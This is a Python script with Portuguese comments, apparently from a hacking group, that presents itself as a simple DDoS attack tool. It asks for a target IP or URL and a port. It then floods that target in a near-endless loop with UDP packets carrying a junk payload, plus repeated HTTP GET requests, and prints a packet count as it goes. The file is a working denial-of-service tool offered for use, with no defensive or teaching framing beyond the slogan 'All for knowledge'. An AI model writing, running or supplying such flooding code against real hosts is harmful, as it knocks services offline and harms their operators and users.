'''
ferramenta de ataque DDoS

O DDoS_NetFy faz um ataque de DDoS simples, desenvolvido por uma pessoa só

Group ShadowByte

"All for knowledge"

'''

# importa todas a bibliotecas
import socket
import time
from colorama import init, Fore, Style
import pyfiglet
import os
import sys
import requests

# iniciar
init()

# tratamento de erros try-except
try:
    # inicia o socket
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2)

# erro o socket
except socket.error:
    print(Fore.GREEN+"erro no socket"+Style.RESET_ALL)
    exit()

# try para erro
try:
    # cria uma função chamada plataforma e ver qual sistema operacional está sendo usado para poder limpar a tela
    def plataforma():
        os.system("cls" if os.name == "linux" else "clear")
    
    # fecha a função plataforma
    plataforma()
      
    # cria uma função chamada logo e dentro da função imprimi o texto DDoS_NetFy bem grande
    def logo():
        lg = pyfiglet.figlet_format("DDoS_NetFy")
        print(Fore.YELLOW+f"{lg}"+Style.RESET_ALL)
    
    # fecha a função logo
    logo()

    # configura o ip, url e a porta desejada
    ip = input(Fore.BLUE+"digite o ip ou url: "+Style.RESET_ALL)
    port = int(input(Fore.BLUE+"digite a porta: "+Style.RESET_ALL))

    # pede qual mensagem você quer enviar para o ip ou url
    msg = (Fore.RED + "ataque ddos fhyfuhoayyysfyhneruyfcreyuafeyfouahyfggfdgdfgdfgggdgfgfdgfdgfgghfghghghghgyfdyftftyhtfhgdhughghugrtyghhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhtsgggfghfdghfdhgfdhgfdghfdghfdgfdghfdghfdghfdgfdghfdghfdygfdyfdygfdgyfdygfdygfdygfdfdyfdyfdyfdyfdyfdygfgydgyusgfdsuyfgsfyugfdsuygdfsyhfgfhfgdhgdhfghdjgshskhgsyuergyhurrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrg" + Style.RESET_ALL)
    time.sleep(2)
    
     # inicia o ataque quando a contagem acaba
    for i in reversed(range(0, 6)):
        print(Fore.YELLOW + f"iniciando ataque em {i}" + Style.RESET_ALL, end="\r")
        
        time.sleep(1)
        continue
    
    # espera 2 segundos para começar o ataque
    print("\n", Fore.CYAN + "Ataque iniciado com sucesso" + Style.RESET_ALL)
    time.sleep(2)
    
    # loop for de 1 até 10000000000
    for i in range(1, 10000000000):
            try:
            	# envia a mensagen em bytes
            	msg_bytes = msg.encode('utf-8')
            	s.sendto(msg_bytes, (ip, port))
            				
            except socket.error as e:
            	print(Fore.RED+f"ERRO SOCKET: {e}"+Style.RESET_ALL)
            	exit()
            	
            try:
            	# imprimi "pacotes udp enviados" e o tanto que ele foi enviada
            	print(Fore.GREEN + f"pacotes udp enviados: {i} ip/url: {ip} porta: {port}" + Style.RESET_ALL)
            	try:
            		fload = requests.get(f"http://{ip}")
            			
            	except requests.exceptions.RequestException as e:
            		print(Fore.RED+f"ERRO {e}"+Style.RESET_ALL)
            		exit()
            		
            except Exception as e:
            	print(Fore.BLUE + f"erro {e}" + Style.RESET_ALL)
            	exit()

# tratamento de erro pro erro KeyboardInterrupt
except KeyboardInterrupt:
    print(Fore.RED+"\n \nsaindo..."+Style.RESET_ALL)
    time.sleep(3)

'''
desenvolved by DarkZero
'''

# fim
